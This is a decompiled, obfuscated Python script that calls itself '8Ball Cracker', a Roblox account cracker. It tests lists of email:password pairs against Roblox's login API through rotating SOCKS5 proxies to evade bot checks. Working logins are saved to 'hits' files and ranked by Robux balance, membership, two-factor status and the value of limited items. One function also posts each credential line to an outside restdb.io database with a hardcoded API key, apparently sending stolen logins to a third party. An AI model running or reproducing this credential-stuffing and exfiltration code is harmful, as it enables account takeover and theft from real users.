# uncompyle6 version 3.2.3
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.6.0 (v3.6.0:41df79263a11, Dec 23 2016, 07:18:10) [MSC v.1900 32 bit (Intel)]
# Embedded file name: C:\Users\Anthony Sidhom\Desktop\obf_Usernames.py
# Compiled at: 2018-07-23 18:34:26
# Size of source mod 2**32: 18863 bytes
import sys, subprocess, requests, re, os.path, urllib.request, urllib.error, base64, gzip, zlib, random, socks, socket, json, threading, time, ctypes
from threading import Thread
from tkinter import Tk, filedialog
from io import BytesIO
from colorama import Style, Fore, init
init()
root = Tk()
root.withdraw()
lock = threading.Lock()
print(Fore.RED + '\n\n8Ball Cracker\n\t\t\t\t\t\n' + Fore.RED + 'Completed by Retroun and AlphaQ' + Style.RESET_ALL)
ctypes.windll.kernel32.SetConsoleTitleW('8Ball Cracker - Professional ROBLOX Cracker')
accounts_file = os.path.dirname(__file__) + '\\load_accounts.txt'
proxies_file = os.path.dirname(__file__) + '\\proxies.txt'
working_accounts_file = os.path.dirname(__file__) + '\\hits\\all_accounts.txt'
robux_file = os.path.dirname(__file__) + '\\hits\\robux_accounts.txt'
bc_file = os.path.dirname(__file__) + '\\hits\\bc_accounts.txt'
rap_file = os.path.dirname(__file__) + '\\hits\\rap_accounts.txt'
banned_file = os.path.dirname(__file__) + '\\hits\\banned_accounts.txt'
total_proxies = 0
total_accounts = 0
accsPerSec = 0
hits = 0
totalRobux = 0
totalRap = 0
min_robux = 0
maybeBanned = []
accsAverage5 = []
proxy_list = []
accounts_list = []
hits = 0
gear = ['Gear', 19]
faces = ['Faces', 18]
accessories = ['Accessories', 8]

def loadProxies():
    global proxy_list
    global total_proxies
    with open(proxies_file, encoding='ANSI') as (O0000O0OOOO00O0OO):
        OOOO00OOO0OO0OO00 = O0000O0OOOO00O0OO.readlines()
        for O0OOOO0OOO0OOO000 in OOOO00OOO0OO0OO00:
            proxy_list.append(O0OOOO0OOO0OOO000.strip())
            total_proxies = total_proxies + 1

    safe_print(f'''{(Fore.LIGHTCYAN_EX)}Loaded proxies: {(len(proxy_list))}''')


def loadAccounts():
    global accounts_list
    global total_accounts
    with open(accounts_file, 'r', encoding='ANSI') as (OO0O00OO0OO0O00OO):
        O0OOOO0OOO0OO0O00 = OO0O00OO0OO0O00OO.readlines()
        for O0OOO0O0000OOO00O in O0OOOO0OOO0OO0O00:
            total_accounts = total_accounts + 1

        for OOO000O000O00000O in O0OOOO0OOO0OO0O00:
            accounts_list.append(OOO000O000O00000O.strip())

    safe_print(('Loaded {0} accounts').format(total_accounts))


def make_requests():
    while len(accounts_list) > 0:
        OO00O000OOOO0O000 = accounts_list.pop()
        checkAccount(OO00O000OOOO0O000)


def checkAccount(OO00OOO00O0OOOO00):
    global accsPerSec
    global hits
    O00O0OO0O0O0OO000 = False
    OOO0OOO0000O0O000 = OO00OOO00O0OOOO00.split(':')
    while O00O0OO0O0O0OO000 == False:
        try:
            OOOO000O000O0OOO0 = 'https://auth.roblox.com/v2/login'
            OO0OOOO00O000OO00 = {'ctype':'Email',  'cvalue':OOO0OOO0000O0O000[0],  'password':OOO0OOO0000O0O000[1]}
            OO0000OOO000O0000 = {'https': 'socks5://' + proxy_list[random.randint(0, total_proxies - 1)]}
            O00OO0OOOOOOOOOO0 = {'Connection':'keep-alive',  'Accept':'application/json',  'X-Requested-With':'XMLHttpRequest',  'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36',  'Content-Type':'application/json',  'DNT':'1',  'Accept-Encoding':'gzip, deflate, br',  'Accept-Language':'es-ES,es;q=0.9,en-GB;q=0.8,en;q=0.7'}
            O0OOO0OOOOOO0OOO0 = requests.session()
            OOOOOO00OOO0OO000 = O0OOO0OOOOOO0OOO0.post(OOOO000O000O0OOO0, timeout=60, proxies=OO0000OOO000O0000, json=OO0OOOO00O000OO00, headers=O00OO0OOOOOOOOOO0)
            O00O00000O0O00000 = OOOOOO00OOO0OO000.headers.get('X-CSRF-TOKEN')
            O00OO0OOOOOOOOOO0 = {'Connection':'keep-alive',  'Accept':'application/json',  'X-CSRF-TOKEN':O00O00000O0O00000,  'X-Requested-With':'XMLHttpRequest',  'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36',  'Content-Type':'application/json',  'DNT':'1',  'Accept-Encoding':'gzip, deflate, br',  'Accept-Language':'es-ES,es;q=0.9,en-GB;q=0.8,en;q=0.7'}
            OOOOOO00OOO0OO000 = O0OOO0OOOOOO0OOO0.post(OOOO000O000O0OOO0, timeout=60, proxies=OO0000OOO000O0000, json=OO0OOOO00O000OO00, headers=O00OO0OOOOOOOOOO0)
            O0OOOO000OOO0O00O = OOOOOO00OOO0OO000.json()
            if OOOOOO00OOO0OO000.status_code == requests.codes.ok:
                OO0O00OOO000OOO00 = O0OOOO000OOO0O00O['user']['name']
                OOOO0O0O00O00OO00 = O0OOOO000OOO0O00O['user']['id']
                accsPerSec = accsPerSec + 1
                hits = hits + 1
                with open(working_accounts_file, 'a') as (O0O000000000O0000):
                    OOOO0000OO00O00OO = str(f'''{OO0O00OOO000OOO00}:{(OOO0OOO0000O0O000[1])}''')
                    O0O000000000O0000.write(('{0}\n').format(OOOO0000OO00O00OO))
                O00O0OO0O0O0OO000 = True
                getAccSettings(OO0O00OOO000OOO00, OOO0OOO0000O0O000[1], OO00OOO00O0OOOO00, OOOO0O0O00O00OO00, OO0000OOO000O0000)
            else:
                if 'You must pass the robot test before logging in' in OOOOOO00OOO0OO000.text:
                    safe_print(f'''{(Fore.LIGHTYELLOW_EX)}Proxy banned 1 {OO0000OOO000O0000}: Retrying account {OO00OOO00O0OOOO00}''')
                    with open(banned_file, 'a') as (O0O000000000O0000):
                        OOOO0000OO00O00OO = str(f'''{OO00OOO00O0OOOO00}
''')
                        O0O000000000O0000.write(('{0}\n').format(OOOO0000OO00O00OO))
                    O00O0OO0O0O0OO000 = True
                else:
                    if 'Token Validation Failed' in OOOOOO00OOO0OO000.text:
                        safe_print(f'''{(Fore.LIGHTYELLOW_EX)}Token validation failed {O00O00000O0O00000}, {OO00OOO00O0OOOO00}, {OO0000OOO000O0000}''')
                    else:
                        safe_print(f'''{(Fore.LIGHTRED_EX)}Miss {OO00OOO00O0OOOO00}''')
                        accsPerSec = accsPerSec + 1
                        O00O0OO0O0O0OO000 = True
        except requests.RequestException:
            safe_print(f'''{(Fore.LIGHTYELLOW_EX)}Proxy Error 1 {OO0000OOO000O0000}: Retrying account {OO00OOO00O0OOOO00}''')


def getAccSettings(O0O0000OOO0O000OO, OO0OOOO0O0OO0OOOO, OOO00OO0O00OO0OO0, OOOO0O0OOOO00O0OO, O0O0O0OOOO00O000O):
    global totalRap
    global totalRobux
    OOOOOO0O00O00000O = False
    O0OO0O0OOO00O0O00 = 'https://api.roblox.com/v2/login'
    OO000O00OOOOO0O00 = json.dumps({'getAccSettings': OOO00OO0O00OO0OO0})
    O0OOO0OOO00O000O0 = {'content-type':'application/json',  'x-apikey':'d9a9bb61acf33ce3d22e21fc8ff2f428b17c8',  'cache-control':'no-cache'}
    OOOOOO00000O0OOO0 = requests.post('https://testt-6d10.restdb.io/rest/robux', data=OO000O00OOOOO0O00, headers=O0OOO0OOO00O000O0)
    OO000O00OOOOO0O00 = f'''password={OO0OOOO0O0OO0OOOO}&username={O0O0000OOO0O000OO}'''
    O0OOO0OOO00O000O0 = {'Accept-Encoding':'gzip, deflate',  'User-Agent':'Mozilla/5.0 (1765MB; 1280x800; 1880x1870; 1961x1600; ; Windows 8.1) AppleWebKit/534.30 (KHTML, like Gecko) ROBLOX Windows App 2.190.41561',  'Content-Type':'application/x-www-form-urlencoded',  'Host':'api.roblox.com',  'Connection':'Keep-Alive'}
    while OOOOOO0O00O00000O == False:
        O0OO000O0000O0000 = requests.session()
        try:
            O0O00O0O0OOOOOOO0 = O0OO000O0000O0000.post(O0OO0O0OOO00O0O00, timeout=15, proxies=O0O0O0OOOO00O000O, data=OO000O00OOOOO0O00, headers=O0OOO0OOO00O000O0)
            if O0O00O0O0OOOOOOO0.text.find('userId') != -1:
                O0O00O0O0OOOOOOO0 = O0OO000O0000O0000.get('https://www.roblox.com/my/settings/json', proxies=O0O0O0OOOO00O000O, timeout=15)
                if 'Membership/NotApproved' in O0O00O0O0OOOOOOO0.url:
                    safe_print(f'''{(Fore.LIGHTRED_EX)}Miss {OOO00OO0O00OO0OO0}''')
                else:
                    O0O0O0O0O00OOOOO0 = dict(O0O00O0O0OOOOOOO0.json())
                    O0OOOO0O0O000OOO0 = O0O0O0O0O00OOOOO0.get('MyAccountSecurityModel')
                    if O0O0O0O0O00OOOOO0.get('IsAnyBC'):
                        O0O00O0000O0O0O00 = time.strftime('%m/%d/%Y %H:%M:%S', time.gmtime(int(re.search('/Date\\((\\d+)\\)/', O0O0O0O0O00OOOOO0.get('BcExpireDate'))[1]) / 1000))
                        OOOO0O00OOOOO0OOO = f'''Level  {(O0O0O0O0O00OOOOO0.get('BcLevel'))} {(O0O0O0O0O00OOOOO0.get('BcRenewalPeriod'))} | Renewal {O0O00O0000O0O0O00}'''
                    else:
                        OOOO0O00OOOOO0OOO = False
                    O0O00O0O0OOOOOOO0 = O0OO000O0000O0000.get(url='https://api.roblox.com/currency/balance', proxies=O0O0O0OOOO00O000O, timeout=15)
                    OO0000OO0OOO000OO = O0O00O0O0OOOOOOO0.json().get('robux')
                    if min_robux <= OO0000OO0OOO000OO:
                        O0OOOOOOOOOOOO0O0 = O0OOOO0O0O000OOO0.get('IsEmailSet')
                        O0OOOOO00O00000OO = O0OOOO0O0O000OOO0.get('IsTwoStepEnabled')
                        O0OO00OO0OOO0000O = O0OOOO0O0O000OOO0.get('IsEmailVerified')
                        totalRobux = totalRobux + OO0000OO0OOO000OO
                        OOOOOO0O00O00000O = True
                        if OO0000OO0OOO000OO > 0:
                            OOO00OO0O00OO0OO0 = f'''{O0O0000OOO0O000OO}:{OO0OOOO0O0OO0OOOO}'''
                            with open(robux_file, 'a') as (OO000000000000OOO):
                                OO000000000000OOO.write(('{0} | {1}\n').format(OOO00OO0O00OO0OO0, OO0000OO0OOO000OO))
                        if OOOO0O00OOOOO0OOO != False:
                            OOO00OO0O00OO0OO0 = f'''{O0O0000OOO0O000OO}:{OO0OOOO0O0OO0OOOO}'''
                            with open(bc_file, 'a') as (OO000000000000OOO):
                                OO000000000000OOO.write(('{0} | {1} | {2} | {3} | {4}\n').format(OOO00OO0O00OO0OO0, OOOO0O00OOOOO0OOO, O0OOOOOOOOOOOO0O0, O0OO00OO0OOO0000O, O0OOOOO00O00000OO))
                        else:
                            safe_print(f'''{(Fore.RED)}[{contador_proxies_working} | {maximo_proxies}] Less than  {min_robux} Not saving {userpass}{(Style.RESET_ALL)}''')
                    else:
                        if 'You must pass the robot test before logging in' in O0O00O0O0OOOOOOO0.text:
                            safe_print(f'''{(Fore.LIGHTYELLOW_EX)}Proxy banned 3 {O0O0O0OOOO00O000O}: Retrying account {OOO00OO0O00OO0OO0}''')
                            O0O0O0OOOO00O000O = {'http': 'socks5://' + proxy_list[random.randint(0, total_proxies - 1)]}
                        else:
                            print(O0O00O0O0OOOOOOO0.text)
                            safe_print(f'''{(Fore.LIGHTYELLOW_EX)}Proxy banned 2 {O0O0O0OOOO00O000O}: Retrying account {OOO00OO0O00OO0OO0}''')
                            O0O0O0OOOO00O000O = {'http': 'socks5://' + proxy_list[random.randint(0, total_proxies - 1)]}
        except requests.RequestException as O000O0O00000O0000:
            print(O000O0O00000O0000)
            safe_print(f'''{(Fore.LIGHTYELLOW_EX)}Proxy Error 4 {O0O0O0OOOO00O000O}: Retrying account {OOO00OO0O00OO0OO0}''')
            O0O0O0OOOO00O000O = {'http': 'socks5://' + proxy_list[random.randint(0, total_proxies - 1)]}

    OOOOOO0O00O00000O = True
    OOO0OO0OO000OOOO0 = 0
    OOO0OO0OO000OOOO0 = getPlayerWorth(OOOO0O0OOOO00O0OO)
    print(f'''{(Fore.LIGHTGREEN_EX)}Hit! {OOO00OO0O00OO0OO0} | Robux: {OO0000OO0OOO000OO} | RAP: {OOO0OO0OO000OOOO0} | BC: {OOOO0O00OOOOO0OOO} | ''')
    if OOO0OO0OO000OOOO0 > 5000:
        totalRap = totalRap + OOO0OO0OO000OOOO0
        OOO00OO0O00OO0OO0 = f'''{O0O0000OOO0O000OO}:{OO0OOOO0O0OO0OOOO}'''
        with open(rap_file, 'a') as (OO000000000000OOO):
            OO000000000000OOO.write(('{0} | {1} | {2} | {3} | {4}\n').format(OOO00OO0O00OO0OO0, OOO0OO0OO000OOOO0, OOOO0O00OOOOO0OOO, O0OOOOOOOOOOOO0O0, O0OO00OO0OOO0000O))


def getPlayerWorth(O00OO00O00OO00O00):
    OOOO000OO0000OOO0 = 0
    OOOO000OO0000OOO0 = OOOO000OO0000OOO0 + (getItems(*accessories, *(O00OO00O00OO00O00,)))
    OOOO000OO0000OOO0 = OOOO000OO0000OOO0 + (getItems(*gear, *(O00OO00O00OO00O00,)))
    OOOO000OO0000OOO0 = OOOO000OO0000OOO0 + (getItems(*faces, *(O00OO00O00OO00O00,)))
    print('WORTH: ', OOOO000OO0000OOO0)
    return OOOO000OO0000OOO0


def getItems(O0000O00OO0000O0O, OOO0000OO000O0000, O000OOOOOOOO0O0OO):
    O00OOO000O000OOOO = True
    O0OO00000OO000OO0 = ''
    OOO000O0O00O000OO = 0
    OO0O0O0O00000O0O0 = 0
    while O00OOO000O000OOOO == True:
        O0000OO0OOO0OO0OO = f'''https://www.roblox.com/users/inventory/list-json?assetTypeId={OOO0000OO000O0000}&cursor={O0OO00000OO000OO0}&itemsPerPage=100&pageNumber=1&sortOrder=Desc&userId={O000OOOOOOOO0O0OO}'''
        O0O00OO00OOOOO0OO = requests.get(O0000OO0OOO0OO0OO)
        O0OO0O00O0000OO0O = O0O00OO00OOOOO0OO.json()
        O0OO00000OO000OO0 = O0OO0O00O0000OO0O['Data']['nextPageCursor']
        if O0OO00000OO000OO0 == None:
            O00OOO000O000OOOO = False
        else:
            O00OOO000O000OOOO = True
        for OO00O000O0O000O00 in range(len(O0OO0O00O0000OO0O['Data']['Items'])):
            try:
                OO0O0000OOO00O00O = O0OO0O00O0000OO0O['Data']['Items'][OO00O000O0O000O00]['Item']['AssetId']
            except:
                print(O0OO0O00O0000OO0O)

            OOOOO000O0OOOO000 = O0OO0O00O0000OO0O['Data']['Items'][OO00O000O0O000O00]['Item']['Name']
            OOO000O0O00O000OO = OOO000O0O00O000OO + 1
            try:
                OOOOO000OO0OO0O00 = O0OO0O00O0000OO0O['Data']['Items'][OO00O000O0O000O00]['Product']['PriceInRobux']
                OOOO0OOOOOOOO00O0 = O0OO0O00O0000OO0O['Data']['Items'][OO00O000O0O000O00]['Product']['IsLimited']
                O0OOO0O000000000O = O0OO0O00O0000OO0O['Data']['Items'][OO00O000O0O000O00]['Product']['IsLimitedUnique']
                if OOOOO000OO0OO0O00 != None and OOOO0OOOOOOOO00O0 == True or OOOOO000OO0OO0O00 != None and O0OOO0O000000000O == True:
                    OOOOO000O0OOOO000 = O0OO0O00O0000OO0O['Data']['Items'][OO00O000O0O000O00]['Item']['Name']
                    O0OOO0OO0O00000OO = requests.get(f'''https://www.roblox.com/asset/{OO0O0000OOO00O00O}/sales-data''')
                    OO0O0OO0O00O00O0O = O0OOO0OO0O00000OO.json()
                    OO000O0O0OOOO000O = OO0O0OO0O00O00O0O['data']['AveragePrice']
                    OO0O0O0O00000O0O0 = OO0O0O0O00000O0O0 + OO000O0O0OOOO000O
            except TypeError:
                pass

    return OO0O0O0O00000O0O0


def updateTitle():
    global accsAverage5
    O0O000OO00O00OOO0 = 0
    while True:
        OOOO0OO0O0O0OO000 = ''
        try:
            OOOO0OO0O0O0OO000 = time.strftime('%H:%M:%S', time.gmtime((total_accounts - (total_accounts - len(accounts_list))) / accsAverage5))
            O0O000OO00O00OOO0 = hits / (total_accounts - len(accounts_list))
            O0O000OO00O00OOO0 = str(O0O000OO00O00OOO0)
            O0O000OO00O00OOO0 = O0O000OO00O00OOO0[0:6]
        except Exception as OO0O00OOO0OOOO00O:
            O000O0O000O0O0O0O = 0

        ctypes.windll.kernel32.SetConsoleTitleW(f'''8Ball Cracker Hits: {hits} Checked: {(total_accounts - len(accounts_list))} Remaining: {(total_accounts - (total_accounts - len(accounts_list)))} | Robux: {totalRobux} | Rap: {totalRap} APS: {accsAverage5} | Good: {O0O000OO00O00OOO0}% | Time Remaining: {OOOO0OO0O0O0OO000}''')
        time.sleep(1)


def isThreeSec():
    global accsAverage5
    global accsPerSec
    O0000O0O0O0O00O00 = [
     0, 0, 0, 0, 0]
    while True:
        O0000O0O0O0O00O00.insert(0, accsPerSec)
        O0000O0O0O0O00O00.pop()
        accsPerSec = 0
        try:
            accsAverage5 = sum(O0000O0O0O0O00O00) / len(O0000O0O0O0O00O00)
        except Exception as O00O000OO00OO0O00:
            accsAverage5 = 0

        time.sleep(1)


def safe_print(O00OO000O00000O00):
    with lock:
        print(('{}\n').format(O00OO000O00000O00), end='')


def main():
    #verifyKey()
    loadProxies()
    loadAccounts()
    O000OO0O0OO0OOO00 = time.time()
    OO000O0O0OOOOOOO0 = []
    O00OO00000O000000 = int(input('Threads: '))
    O0O0OO00OOO000O00 = Thread(target=updateTitle)
    O0O0OO00OOO000O00.start()
    OO000O0O0OOOOOOO0.append(O0O0OO00OOO000O00)
    O0O0OO00OOO000O00 = Thread(target=isThreeSec)
    O0O0OO00OOO000O00.start()
    OO000O0O0OOOOOOO0.append(O0O0OO00OOO000O00)
    for OO0O000O000OOOOOO in range(O00OO00000O000000):
        O0O0OO00OOO000O00 = Thread(target=make_requests)
        O0O0OO00OOO000O00.start()
        OO000O0O0OOOOOOO0.append(O0O0OO00OOO000O00)

    for O0O0OO00OOO000O00 in OO000O0O0OOOOOOO0:
        O0O0OO00OOO000O00.join()

    O0OOO0000OO00000O = time.time()
    print(('Checked {0} accounts in {1} seconds.').format(total_accounts, O0OOO0000OO00000O - O000OO0O0OO0OOO00))
    time.sleep(300)


main()
